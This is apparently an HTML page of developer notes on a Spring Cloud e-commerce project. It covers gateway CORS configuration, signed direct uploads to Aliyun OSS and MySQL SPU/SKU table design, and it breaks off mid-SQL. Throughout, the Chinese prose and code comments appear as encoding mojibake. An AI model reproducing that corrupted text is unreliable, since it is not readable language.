<h2 id="CORSä»‹ç»"><a href="#CORSä»‹ç»" class="headerlink" title="CORSä»‹ç»"></a>CORSä»‹ç»</h2><p>CORSæ˜¯ä¸€ä¸ªW3Cæ ‡å‡†ï¼Œå…¨ç§°æ˜¯â€è·¨åŸŸèµ„æºå…±äº«â€ï¼ˆCross-origin resource sharingï¼‰ã€‚</p>
<p>å®ƒå…è®¸æµè§ˆå™¨å‘è·¨æºæœåŠ¡å™¨ï¼Œå‘å‡º<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html"><code>XMLHttpRequest</code></a>è¯·æ±‚ï¼Œä»è€Œå…‹æœäº†AJAXåªèƒ½<a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html">åŒæº</a>ä½¿ç”¨çš„é™åˆ¶ã€‚</p>
<p>CORSéœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨åŒæ—¶æ”¯æŒã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ï¼ŒIEæµè§ˆå™¨ä¸èƒ½ä½äºIE10ã€‚</p>
<ul>
<li><p>æµè§ˆå™¨ç«¯ï¼š</p>
<p>ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ï¼ˆIE10ä»¥ä¸‹ä¸è¡Œï¼‰ã€‚æ•´ä¸ªCORSé€šä¿¡è¿‡ç¨‹ï¼Œéƒ½æ˜¯æµè§ˆå™¨è‡ªåŠ¨å®Œæˆï¼Œä¸éœ€è¦ç”¨æˆ·å‚ä¸ã€‚æµè§ˆå™¨ä¼šåœ¨å‘å‡ºajaxæ—¶è¯¢é—®æœåŠ¡ç«¯æ˜¯å¦å…è®¸å½“å‰ç½‘ç«™çš„è·¨åŸŸè¯·æ±‚ï¼Œå¹¶æ ¹æ®æœåŠ¡ç«¯å“åº”åšå‡ºæ‹¦æˆªæˆ–æ”¾è¡Œçš„å¤„ç†ã€‚</p>
</li>
<li><p>æœåŠ¡ç«¯ï¼š</p>
<p>CORSé€šä¿¡ä¸AJAXæ²¡æœ‰ä»»ä½•å·®åˆ«ï¼Œå› æ­¤ä½ ä¸éœ€è¦æ”¹å˜ä»¥å‰çš„ä¸šåŠ¡é€»è¾‘ã€‚åªä¸è¿‡ï¼Œæµè§ˆå™¨ä¼šåœ¨è¯·æ±‚ä¸­æºå¸¦ä¸€äº›å¤´ä¿¡æ¯ï¼Œè¡¨æ˜è¯·æ±‚è€…çš„èº«ä»½ã€‚æœåŠ¡ç«¯æ¥æ”¶åˆ°ä»¥åï¼Œéœ€è¦å¯¹è¿™äº›ä¿¡æ¯åšå‡ºåˆ¤æ–­ï¼Œå¦‚æœå…è®¸åˆ™éœ€è¦åœ¨è¿”å›çš„å¤´ä¿¡æ¯ä¸­æºå¸¦ä¸€äº›è®¸å¯çš„å£°æ˜ã€‚</p>
</li>
</ul>
<h2 id="SpringCloudGatewayçš„CORS"><a href="#SpringCloudGatewayçš„CORS" class="headerlink" title="SpringCloudGatewayçš„CORS"></a>SpringCloudGatewayçš„CORS</h2><p>åœ¨SpringCloudGatewayä¸­ï¼Œå·²ç»æä¾›äº†é»˜è®¤çš„CORSå®ç°ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡application.ymlåšç®€å•é…ç½®å³å¯ã€‚æˆ‘ä»¬åœ¨<code>ly-gateway</code>ä¸­çš„<code>application.yml</code>ä¸­æ·»åŠ ä¸€äº›é…ç½®ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">default-filters:</span> <span class="comment"># é»˜è®¤è¿‡æ»¤é¡¹</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Hystrix</span> <span class="comment"># æŒ‡å®šè¿‡æ»¤å·¥å‚åç§°ï¼ˆå¯ä»¥æ˜¯ä»»æ„è¿‡æ»¤å·¥å‚ç±»å‹ï¼‰</span></span><br><span class="line">        <span class="attr">args:</span> <span class="comment"># æŒ‡å®šè¿‡æ»¤çš„å‚æ•°</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">fallbackcmd</span>  <span class="comment"># hystrixçš„æŒ‡ä»¤å</span></span><br><span class="line">          <span class="attr">fallbackUri:</span> <span class="string">forward:/hystrix/fallback</span> <span class="comment"># å¤±è´¥åçš„è·³è½¬è·¯å¾„</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">StripPrefix=1</span> <span class="comment"># å»é™¤è·¯ç”±å‰ç¼€</span></span><br><span class="line">      <span class="attr">globalcors:</span> <span class="comment"># å…¨å±€çš„è·¨åŸŸå¤„ç†</span></span><br><span class="line">        <span class="attr">add-to-simple-url-handler-mapping:</span> <span class="literal">true</span> <span class="comment"># æ˜¯å¦å°†å½“å‰corsé…ç½®åŠ å…¥åˆ°SimpleUrlHandlerMappingä¸­ï¼Œè§£å†³optionsè¯·æ±‚è¢«æ‹¦æˆªé—®é¢˜</span></span><br><span class="line">        <span class="attr">corsConfigurations:</span></span><br><span class="line">          <span class="string">&#x27;[/**]&#x27;</span><span class="string">:</span></span><br><span class="line">            <span class="attr">allowedOrigins:</span> <span class="comment"># å…è®¸å“ªäº›ç½‘ç«™çš„è·¨åŸŸè¯·æ±‚</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;http://manage.leyou.com&quot;</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;http://www.leyou.com&quot;</span></span><br><span class="line">            <span class="attr">allowedMethods:</span> <span class="comment"># å…è®¸çš„è·¨åŸŸajaxçš„è¯·æ±‚æ–¹å¼</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;POST&quot;</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;DELETE&quot;</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;PUT&quot;</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;OPTIONS&quot;</span></span><br><span class="line">            <span class="attr">allowedHeaders:</span> <span class="string">&quot;*&quot;</span> <span class="comment"># å…è®¸åœ¨è¯·æ±‚ä¸­æºå¸¦çš„å¤´ä¿¡æ¯</span></span><br><span class="line">            <span class="attr">allowCredentials:</span> <span class="literal">true</span> <span class="comment"># æ˜¯å¦å…è®¸æºå¸¦cookie</span></span><br><span class="line">            <span class="attr">maxAge:</span> <span class="number">360000</span> <span class="comment"># è¿™æ¬¡è·¨åŸŸæ£€æµ‹çš„æœ‰æ•ˆæœŸ</span></span><br></pre></td></tr></table></figure>

<h1 id="ä¸Šä¼ æ–‡ä»¶åˆ°OSS"><a href="#ä¸Šä¼ æ–‡ä»¶åˆ°OSS" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶åˆ°OSS"></a>ä¸Šä¼ æ–‡ä»¶åˆ°OSS</h1><h2 id="ä¼ ç»Ÿæ–¹å¼"><a href="#ä¼ ç»Ÿæ–¹å¼" class="headerlink" title="ä¼ ç»Ÿæ–¹å¼"></a>ä¼ ç»Ÿæ–¹å¼</h2><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨javaä»£ç æ¥å®ç°æŠŠå›¾ç‰‡ä¸Šä¼ åˆ°OSSï¼Œä¸è¿‡è¿™æ ·ä»¥æ¥æ–‡ä»¶ä¼šå…ˆä»å®¢æˆ·ç«¯æµè§ˆå™¨ä¸Šä¼ åˆ°æˆ‘ä»¬çš„æœåŠ¡ç«¯tomcatï¼Œç„¶åå†ä¸Šä¼ åˆ°OSSï¼Œæ•ˆç‡è¾ƒä½ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022656.png" alt="1552311281042"></p>
<p>ä»¥ä¸Šæ–¹æ³•æœ‰ä¸‰ä¸ªç¼ºç‚¹ï¼š</p>
<ul>
<li>ä¸Šä¼ æ…¢ã€‚å…ˆä¸Šä¼ åˆ°åº”ç”¨æœåŠ¡å™¨ï¼Œå†ä¸Šä¼ åˆ°OSSï¼Œç½‘ç»œä¼ é€æ¯”ç›´ä¼ åˆ°OSSå¤šäº†ä¸€å€ã€‚å¦‚æœç›´ä¼ åˆ°OSSï¼Œä¸é€šè¿‡åº”ç”¨æœåŠ¡å™¨ï¼Œé€Ÿåº¦å°†å¤§å¤§æå‡ï¼Œè€Œä¸”OSSé‡‡ç”¨BGPå¸¦å®½ï¼Œèƒ½ä¿è¯å„åœ°å„è¿è¥å•†çš„é€Ÿåº¦ã€‚</li>
<li>æ‰©å±•æ€§å·®ã€‚å¦‚æœåç»­ç”¨æˆ·å¤šäº†ï¼Œåº”ç”¨æœåŠ¡å™¨ä¼šæˆä¸ºç“¶é¢ˆã€‚</li>
<li>è´¹ç”¨é«˜ã€‚éœ€è¦å‡†å¤‡å¤šå°åº”ç”¨æœåŠ¡å™¨ã€‚ç”±äºOSSä¸Šä¼ æµé‡æ˜¯å…è´¹çš„ï¼Œå¦‚æœæ•°æ®ç›´ä¼ åˆ°OSSï¼Œä¸é€šè¿‡åº”ç”¨æœåŠ¡å™¨ï¼Œé‚£ä¹ˆå°†èƒ½çœä¸‹å‡ å°åº”ç”¨æœåŠ¡å™¨ã€‚</li>
</ul>
<h2 id="webå‰ç«¯ç­¾ååç›´ä¼ "><a href="#webå‰ç«¯ç­¾ååç›´ä¼ " class="headerlink" title="webå‰ç«¯ç­¾ååç›´ä¼ "></a>webå‰ç«¯ç­¾ååç›´ä¼ </h2><p>å®¢æˆ·ç«¯é€šè¿‡JavaScriptä»£ç å®Œæˆç­¾åï¼Œç„¶åé€šè¿‡è¡¨å•ç›´ä¼ æ•°æ®åˆ°OSSã€‚æ— éœ€è®¿é—®åº”ç”¨æœåŠ¡å™¨ï¼Œå¯¹åº”ç”¨æœåŠ¡å™¨å‹åŠ›è¾ƒä½ã€‚</p>
<p>æµç¨‹å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022657.png" alt="image-20200127125730699"></p>
<ul>
<li>JavaScriptå®¢æˆ·ç«¯ç­¾åç›´ä¼ ï¼š<ul>
<li>ä¼˜ç‚¹ï¼šåœ¨å®¢æˆ·ç«¯é€šè¿‡JavaScriptä»£ç å®Œæˆç­¾åï¼Œæ— éœ€è¿‡å¤šé…ç½®ï¼Œå³å¯å®ç°ç›´ä¼ ï¼Œéå¸¸æ–¹ä¾¿ã€‚</li>
<li>é—®é¢˜ï¼šå®¢æˆ·ç«¯é€šè¿‡JavaScriptæŠŠAccesssKeyID å’ŒAccessKeySecretå†™åœ¨ä»£ç é‡Œé¢æœ‰æ³„éœ²çš„é£é™©</li>
</ul>
</li>
</ul>
<h2 id="æœåŠ¡ç«¯ç­¾ååç›´ä¼ æµç¨‹"><a href="#æœåŠ¡ç«¯ç­¾ååç›´ä¼ æµç¨‹" class="headerlink" title="æœåŠ¡ç«¯ç­¾ååç›´ä¼ æµç¨‹"></a>æœåŠ¡ç«¯ç­¾ååç›´ä¼ æµç¨‹</h2><p>æœåŠ¡ç«¯ç­¾ååç›´ä¼ çš„åŸç†å¦‚ä¸‹ï¼š</p>
<ol>
<li>ç”¨æˆ·å‘é€ä¸Šä¼ Policyè¯·æ±‚åˆ°åº”ç”¨æœåŠ¡å™¨ï¼ˆæˆ‘ä»¬çš„å¾®æœåŠ¡ï¼‰ã€‚</li>
<li>åº”ç”¨æœåŠ¡å™¨è¿”å›ä¸Šä¼ Policyå’Œç­¾åç»™ç”¨æˆ·ã€‚</li>
<li>ç”¨æˆ·ç›´æ¥ä¸Šä¼ æ•°æ®åˆ°OSSã€‚</li>
</ol>
<p>æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022658.png" alt="1552311833528"></p>
<ul>
<li>æœåŠ¡ç«¯ç­¾åï¼ŒJavaScriptå®¢æˆ·ç«¯ç›´ä¼ ï¼š<ul>
<li>ä¼˜ç‚¹ï¼šWebç«¯å‘æœåŠ¡ç«¯è¯·æ±‚ç­¾åï¼Œç„¶åç›´æ¥ä¸Šä¼ ï¼Œä¸ä¼šå¯¹æœåŠ¡ç«¯äº§ç”Ÿå‹åŠ›ï¼Œè€Œä¸”å®‰å…¨å¯é </li>
<li>é—®é¢˜ï¼šæœåŠ¡ç«¯æ— æ³•å®æ—¶äº†è§£ç”¨æˆ·ä¸Šä¼ äº†å¤šå°‘æ–‡ä»¶ï¼Œä¸Šä¼ äº†ä»€ä¹ˆæ–‡ä»¶</li>
</ul>
</li>
</ul>
<p>åœ¨é¡µé¢ç‚¹å‡»ä¸Šä¼ çš„æŒ‰é’®ï¼Œå¯ä»¥çœ‹åˆ°è¯·æ±‚å·²ç»å‘å‡ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022659.png" alt="image-20200127132348077"> </p>
<p>è¿™æ­£æ˜¯åœ¨å‘æœåŠ¡ç«¯ç”³è¯·ç­¾åï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡ç«¯æ¥æ”¶è¯·æ±‚ï¼Œç”Ÿæˆç­¾åå¹¶è¿”å›ã€‚</p>
<p>æˆ‘ä»¬è¦åšçš„äº‹æƒ…åŒ…æ‹¬ï¼š</p>
<ul>
<li>æ­å»ºå¾®æœåŠ¡</li>
<li>åœ¨å¾®æœåŠ¡ä¸­ï¼Œæä¾›ä¸€ä¸ªæ¥å£ï¼Œç”Ÿæˆæ–‡ä»¶ä¸Šä¼ éœ€è¦çš„ç­¾å<ul>
<li>åˆ†ææ¥å£å£°æ˜ï¼Œåˆ†æè¯·æ±‚æ–¹å¼ã€è¯·æ±‚è·¯å¾„ã€è¯·æ±‚å‚æ•°ã€è¿”å›å€¼ç±»å‹</li>
<li>å®ç°ä¸šåŠ¡ï¼Œç”Ÿæˆç­¾å<ul>
<li>æŠŠä¸€äº›å¸¸é‡é…ç½®åˆ°ymlæ–‡ä»¶</li>
<li>ç¼–å†™ç±»ï¼Œè¯»å–è¿™äº›å±æ€§</li>
<li>æŠŠOSSå®¢æˆ·ç«¯æ³¨å…¥åˆ°springå®¹å™¨</li>
<li>ç¼–å†™ä¸šåŠ¡ï¼Œå®ç°ç­¾åçš„ç”Ÿæˆ</li>
<li>è§£å†³è·¨åŸŸé—®é¢˜(åœ¨é˜¿é‡Œäº‘OSSä¸Šè®¾ç½®)</li>
</ul>
</li>
</ul>
</li>
<li>å‰ç«¯ï¼Œè°ƒç”¨æˆ‘ä»¬çš„æ¥å£ï¼Œè·å–ç­¾åï¼ˆå·²å®Œæˆï¼‰</li>
<li>å‰ç«¯ï¼Œæºå¸¦ç­¾åï¼Œå®Œæˆä¸Šä¼ ï¼ˆå·²å®Œæˆï¼‰</li>
</ul>
<p>ç­¾åè¿”å›å€¼</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;accessId&quot;</span><span class="punctuation">:</span><span class="string">&quot;6MKO******4AUk44&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://post-test.oss-cn-hangzhou.aliyuncs.com&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;policy&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJleHBpcmF0aW9uIjoiMjAxNS0xMS0wNVQyMDo1Mjoy******Jjdb25kaXRpb25zIjpbWyJjdb250ZW50LWxlbmd0aC1yYW5nZSIsMCwxMDQ4NTc2MDAwXSxbInN0YXJ0cy13aXRoIiwiJGtleSIsInVzZXItZGlyXC8iXV19&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span><span class="string">&quot;VsxOcOudx******z93CLaXPz+4s=&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;expire&quot;</span><span class="punctuation">:</span><span class="number">1446727949</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;dir&quot;</span><span class="punctuation">:</span><span class="string">&quot;user-dirs/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¯¦ç»†è§£é‡Šï¼š</p>
<ul>
<li><code>accessId</code>ï¼šç”¨æˆ·çš„AccessKeyId</li>
<li><code>host</code>ï¼šç”³è¯·çš„é˜¿é‡ŒOSSçš„bucketè®¿é—®åœ°å€</li>
<li><code>policy</code>ï¼šæ–‡ä»¶ä¸Šä¼ çš„ç­–ç•¥ï¼Œä¸»è¦åŒ…å«å¯¹ä¸Šä¼ æ–‡ä»¶çš„è¦æ±‚ï¼Œåˆ©ç”¨Base64åŠ å¯†åè¿”å›ï¼Œ<a href="https://help.aliyun.com/document_detail/31988.html?spm=a2c4g.11186623.2.22.58cd7eaer5eXWw#section-d5z-1ww-wdb">è¯´æ˜æ–‡æ¡£</a></li>
<li><code>signature</code>ï¼šç”Ÿæˆçš„ç­¾å</li>
<li><code>expire</code>ï¼šæœ¬æ¬¡ç­¾åçš„è¿‡æœŸæ—¶é—´ï¼Œå®¢æˆ·ç«¯å¯ä»¥æ¢æˆç­¾åï¼Œåœ¨æœ‰æ•ˆæœŸå†…æ— éœ€å†æ¬¡ç­¾å</li>
<li><code>dir</code>ï¼šè¦ä¸Šä¼ åˆ°bucketä¸­çš„å“ªä¸ªç›®å½•</li>
</ul>
<p>ä½¿ç”¨HmacSHA256ç­¾å,ç”¨æˆ·ç”³è¯·åæˆæƒå¾®æœåŠ¡å°†è¿™ä¸ªå‘ç»™å®¢æˆ·ç«¯,å®¢æˆ·ç«¯å°†è¿™ä¸ªå’Œå›¾ç‰‡å‘ç»™é˜¿é‡Œäº‘,é˜¿é‡Œäº‘éªŒè¯åå°±å¯ä»¥ä¸Šä¼ äº†.é˜¿é‡ŒæœåŠ¡å™¨å°†æˆ‘ä»¬çš„ç”¨æˆ‘ä»¬çš„ç§é’¥ç„¶åç”¨åŒæ ·çš„ç®—æ³•ç®—å‡ºç­¾åæ¥éªŒè¯.</p>
<h1 id="å•†å“è®¾è®¡"><a href="#å•†å“è®¾è®¡" class="headerlink" title="å•†å“è®¾è®¡"></a>å•†å“è®¾è®¡</h1><h2 id="å•†å“è§„æ ¼å‚æ•°è®¾è®¡"><a href="#å•†å“è§„æ ¼å‚æ•°è®¾è®¡" class="headerlink" title="å•†å“è§„æ ¼å‚æ•°è®¾è®¡"></a>å•†å“è§„æ ¼å‚æ•°è®¾è®¡</h2><p>å•†å“è§„æ ¼è¡¨tb_spec_param</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_spec_param` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ä¸»é”®&#x27;</span>,</span><br><span class="line">  `category_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;å•†å“åˆ†ç±»id&#x27;</span>,</span><br><span class="line">  `group_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;è§„æ ¼å‚æ•°æ‰€å±çš„ç»„id&#x27;</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;å‚æ•°å&#x27;</span>,</span><br><span class="line">  `<span class="type">numeric</span>` tinyint(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;æ˜¯å¦æ˜¯æ•°å­—ç±»å‹å‚æ•°ï¼Œtrueæˆ–false&#x27;</span>,</span><br><span class="line">  `unit` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;æ•°å­—ç±»å‹å‚æ•°çš„å•ä½ï¼Œéæ•°å­—ç±»å‹å¯ä»¥ä¸ºç©º&#x27;</span>,</span><br><span class="line">  `generic` tinyint(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;æ˜¯å¦æ˜¯skué€šç”¨å±æ€§ï¼Œtrueæˆ–false&#x27;</span>,</span><br><span class="line">  `searching` tinyint(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;æ˜¯å¦ç”¨äºæœç´¢è¿‡æ»¤ï¼Œtrueæˆ–false&#x27;</span>,</span><br><span class="line">  `segments` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;æ•°å€¼ç±»å‹å‚æ•°ï¼Œå¦‚æœéœ€è¦æœç´¢ï¼Œåˆ™æ·»åŠ åˆ†æ®µé—´éš”å€¼ï¼Œå¦‚CPUé¢‘ç‡åŒºé—´ï¼š0.5-1.0,1.1~1.5&#x27;</span>,</span><br><span class="line">  `options` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;å‚æ•°çš„å¯é€‰å€¼ï¼Œä¸å…è®¸ç”¨æˆ·è‡ªå·±å¡«å€¼&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  KEY `key_group` (`group_id`),</span><br><span class="line">  KEY `key_category` (`category_id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">42</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;è§„æ ¼å‚æ•°ç»„ä¸‹çš„å‚æ•°å&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p>è§„æ ¼ç»„è¡¨tb_spec_group,ä¸€ä¸ªè§„æ ¼ç»„å¯¹åº”å¤šä¸ªè§„æ ¼å‚æ•°,ä¸€å¯¹å¤šå…³ç³»,åœ¨è§„æ ¼å‚æ•°ä¸­æŒæœ‰è§„æ ¼ç»„çš„id;</p>
<p>genericæ˜¯å¦æ˜¯skué€šç”¨å±æ€§,ä¾‹å¦‚é¢œè‰²,å†…å­˜ç­‰; </p>
<h2 id="å•†å“è®¾è®¡-1"><a href="#å•†å“è®¾è®¡-1" class="headerlink" title="å•†å“è®¾è®¡"></a>å•†å“è®¾è®¡</h2><p>SPU: Standard product Unit(æ ‡å‡†äº§å“å•ä½),ä¸€ç»„å…·æœ‰å…±åŒå±æ€§çš„å•†å“é›†;</p>
<p>SKU: Stock Keeping Unit(åº“å­˜é‡å•ä½), Spuå•†å“é›†å› å…·ä½“ç‰¹æ€§ä¸åŒè€Œç»†åˆ†çš„æ¯ä¸ªå•†å“</p>
<p>ä¸€ä¸ªSPUåŒ…å«å¤šä¸ªSKU; SPUæ˜¯ä¸€ä¸ªæŠ½è±¡çš„å•†å“é›†æ¦‚å¿µ,ä¸ºäº†æ–¹ä¾¿åå°ç®¡ç†; SKUæ‰æ˜¯å…·ä½“è¦é”€å”®çš„å•†å“,æ¯ä¸€ä¸ªSKUçš„ä»·æ ¼ã€åº“å­˜å¯èƒ½ä¼šä¸ä¸€æ ·,ç”¨æˆ·è´­ä¹°çš„æ˜¯SKUè€Œä¸æ˜¯SPU</p>
<h3 id="ä¸ºä»€ä¹ˆéœ€è¦åˆ†SPUå’ŒSKU"><a href="#ä¸ºä»€ä¹ˆéœ€è¦åˆ†SPUå’ŒSKU" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦åˆ†SPUå’ŒSKU?"></a>ä¸ºä»€ä¹ˆéœ€è¦åˆ†SPUå’ŒSKU?</h3><p>ä¸åŒçš„SKUçš„å±æ€§å¤§éƒ¨åˆ†éƒ½æ˜¯ä¸€æ ·çš„,å¦‚æœåªæœ‰skuè¡¨,é‚£ä¹ˆæ¯ä¸ªSkuéƒ½ä¿å­˜è‡ªå·±çš„ä¸€ä»½æ•°æ®,å°†ä¼šæœ‰å¤§é‡çš„æ•°æ®é‡å¤,è€Œä¸”ä¸æ–¹ä¾¿åæœŸçš„ç»´æŠ¤å’Œç®¡ç†.</p>
<p>SPU:ä¸€ç»„SKUçš„å…±æ€§æ•°æ®;SKU:æ¯ä¸ªSKUçš„ç‰¹æœ‰æ•°æ®</p>
<p>tb_spu</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_spu` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;spu id&#x27;</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;å•†å“åç§°&#x27;</span>,</span><br><span class="line">  `title` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;å•†å“æ ‡ç­¾,æœç´¢å…³é”®å­—ä¿¡æ¯&#x27;</span>,</span><br><span class="line">  `cid1` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;1çº§ç±»ç›®id&#x27;</span>,</span><br><span class="line">  `cid2` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;2çº§ç±»ç›®id&#x27;</span>,</span><br><span class="line">  `cid3` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;3çº§ç±»ç›®id&#x27;</span>,</span><br><span class="line">  `brand_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;å•†å“æ‰€å±å“ç‰Œid&#x27;</span>,</span><br><span class="line">  `saleable` tinyint(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;1&#x27;</span> COMMENT <span class="string">&#x27;æ˜¯å¦ä¸Šæ¶ï¼Œ0ä¸‹æ¶ï¼Œ1ä¸Šæ¶&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;æ·»åŠ æ—¶é—´&#x27;</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;æœ€åä¿®æ”¹æ—¶é—´&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">190</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;spuè¡¨;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åšäº†è¡¨çš„å‚ç›´æ‹†åˆ†, tb_spu_detail</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_spu_detail` (</span><br><span class="line">  `spu_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;å•†å“spuçš„idï¼Œä¸spuè¡¨ä¸€å¯¹ä¸€&#x27;</span>,</span><br><span class="line">  `description` text COMMENT <span class="string">&#x27;å•†å“æè¿°ä¿¡æ¯&#x27;</span>,</span><br><span class="line">  `specification` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;è§„æ ¼å‚æ•°å€¼&#x27;</span>,</span><br><span class="line">  